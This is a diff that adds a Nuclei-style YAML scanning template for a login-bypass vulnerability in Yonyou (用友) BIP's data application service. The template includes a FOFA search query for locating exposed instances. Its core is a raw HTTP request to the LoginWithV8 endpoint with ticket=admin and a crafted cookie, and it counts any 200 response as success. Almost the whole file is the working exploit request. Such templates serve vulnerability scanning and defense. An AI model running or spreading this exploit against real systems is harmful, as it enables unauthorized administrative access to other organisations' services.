@@ -1,0 +1,29 @@
+id: poc-cqvzeximia9tw3kg
+info:
+  name: 用友BIP 数据应用服务 LoginWithV8 存在登录绕过漏洞 - 副本
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cqvzeximia9tw3kg'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cqvzeximia9tw3kg
+    fofa: body="/bi/portal/manifest.json" || body="js/lib/ba.common.js" && body="用友"
+http:
+- raw:
+  - 'GET /bi/api/Portal/LoginWithV8/?ticket=admin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Cookie: _WorkbenchCross_=Ultraman
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
